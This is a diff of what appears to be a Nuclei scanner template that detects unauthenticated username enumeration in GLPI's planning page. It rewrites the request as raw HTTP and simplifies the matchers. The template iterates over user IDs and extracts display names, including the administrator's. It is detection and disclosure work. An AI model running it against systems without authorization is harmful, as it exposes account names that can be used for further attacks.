@@ -1,11 +1,11 @@
-id: glpi-planning-unauth-user-enumeration
+id: glpi-planning-user-enum
 
 info:
   name: GLPI Planning - Unauthenticated Username Enumeration
   author: wong-hau-pepelu
   severity: medium
   description: |
-    GLPI exposes the "check availability" planning view at front/planning.php without authentication when the genical parameter is set, allowing unauthenticated attackers to enumerate user display names by iterating users_id in Planning::checkAvailability(), leading to full username enumeration and a valid-id oracle with no credentials.
+    GLPI exposes the check availability planning view at front/planning.php without authentication when the genical parameter is set, allowing unauthenticated attackers to enumerate user display names by iterating users_id in Planning::checkAvailability(), leading to full username enumeration and a valid-id oracle with no credentials.
   impact: |
     An unauthenticated attacker can enumerate the display names of GLPI users, including the default super-administrator (user id 2), exposing the administrator login and user list to anyone with access to the web interface.
   remediation: |
@@ -28,9 +28,10 @@ info:
   tags: glpi,planning,enum,unauth,vuln
 
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/front/planning.php?genical=1&checkavailability=1&itemtype=User&users_id={{uid}}&begin=2000-01-01&end=2000-01-02"
+  - raw:
+      - |
+        GET /front/planning.php?genical=1&checkavailability=1&itemtype=User&users_id={{uid}}&begin=2000-01-01&end=2000-01-02 HTTP/1.1
+        Host: {{Hostname}}
 
     payloads:
       uid:
@@ -41,17 +42,14 @@ http:
         - "6"
 
     attack: batteringram
-    stop-at-first-match: false
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
+    stop-at-first-match: true
 
-      - type: regex
-        part: body
-        regex:
-          - '<th class="fs-4"[^>]*>[^<]+</th>'
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "fs-4")'
+          - 'status_code == 200'
+        condition: and
 
     extractors:
       - type: regex
